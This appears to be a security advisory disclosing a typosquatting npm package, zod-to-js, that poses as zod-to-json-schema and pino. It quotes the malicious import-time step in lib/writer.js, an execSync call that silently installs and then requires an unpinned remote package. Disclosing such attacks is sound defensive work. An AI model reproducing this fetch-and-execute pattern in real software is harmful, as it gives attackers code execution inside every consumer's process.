summary: zod-to-js performs import-time RCE by installing and executing an unpinned npm package
details: The package masquerades as zod-to-json-schema (README) and pino (main entry, homepage getpino.io) while shipping a malicious lib/writer.js. When any consumer requires zod-to-js, top-level code in lib/writer.js attempts to require('modustack') and on failure runs execSync(`npm install modustack --no-warnings --no-save --no-progress --loglevel silent`) and then require('../../modustack/pino.js'). The fetched modustack package is unpinned, has no integrity check, and its code executes immediately at import time inside the consumer's process. The triple identity layering (name zod-to-js, main pino.js, README of zod-to-json-schema, homepage getpino.io) is consistent with a typosquat designed to confuse installers and reviewers. Combined with attacker-controlled remote code execution at import, this is an unambiguous supply-chain attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
